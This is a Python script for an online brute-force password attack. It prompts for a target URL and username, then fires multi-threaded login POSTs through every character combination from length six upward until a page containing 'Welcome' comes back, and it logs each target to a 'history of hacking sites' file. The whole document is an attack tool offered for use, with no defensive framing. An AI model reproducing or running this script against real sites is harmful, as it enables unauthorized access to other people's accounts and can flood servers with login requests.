import requests
import itertools
import string
import os
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor
import threading
from seleniumbase import SB

HISTORY_FILE = "history of hacking sites.txt"

def load_history():
    if not os.path.exists(HISTORY_FILE):
        return set()
    seen = set()
    with open(HISTORY_FILE, "r", encoding="utf-8") as f:
        for line in f:
            line = line.strip()
            if not line:
                continue
            # Expect lines in the form: <url> <timestamp>
            parts = line.split()
            url = parts[0]
            seen.add(url)
    return seen

def add_to_history(url):
    timestamp = datetime.utcnow().isoformat() + "Z"
    with open(HISTORY_FILE, "a", encoding="utf-8") as f:
        f.write(f"{url} {timestamp}\n")

TARGET_URL = input("what is the target url: ").strip()
if not TARGET_URL.startswith("http://") and not TARGET_URL.startswith("https://"):
    TARGET_URL = "http://" + TARGET_URL

history = load_history()
if TARGET_URL in history:
    proceed = input("This URL appears in history. Proceed anyway? (y/N): ").strip().lower().startswith("y")
    if not proceed:
        print("Aborting per user choice.")
        exit(0)

USERNAME = input("Enter the target username: ").strip()
# Add symbols to the charset
CHARSET = string.ascii_lowercase + string.digits + string.punctuation
MAX_THREADS = 100  # Number of simultaneous requests
found_password = [None]  # Use list to allow mutation in nested function
stop_event = threading.Event()

def attempt_login(password):
    if stop_event.is_set():
        return None
    login_data = {"username": USERNAME, "password": password}
    try:
        response = requests.post(TARGET_URL, data=login_data, timeout=1)
        if "Welcome" in response.text:
            print(f"\n✓ Success! Password found: {password}")
            found_password[0] = password
            stop_event.set()
            return password
    except Exception:
        pass
    return None

def start_brute():
    # Record the target URL in history when starting
    try:
        add_to_history(TARGET_URL)
    except Exception:
        pass
    with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
        # Generate all possible passwords
        futures = []
        for password_length in range(6, 10000000000000000000):  # Adjust the range as needed
            if stop_event.is_set():
                break
            for pw_tuple in itertools.product(CHARSET, repeat=password_length):
                if stop_event.is_set():
                    break
                print(f"Trying password: {''.join(pw_tuple)}", end="\r")
                password = ''.join(pw_tuple)
                future = executor.submit(attempt_login, password)
                futures.append(future)
        # Process results as they complete
        from concurrent.futures import as_completed
        for future in as_completed(futures):
            if stop_event.is_set():
                break
            try:
                future.result(timeout=5)
            except Exception:
                pass
    if found_password[0]:
        print(f"\n✓ Attack successful! Password: {found_password[0]}")
    else:
        print("\n✗ Attack failed. Password not found in the search space.")

if __name__ == "__main__":
    print("Starting optimized brute-force...")
    start_brute()
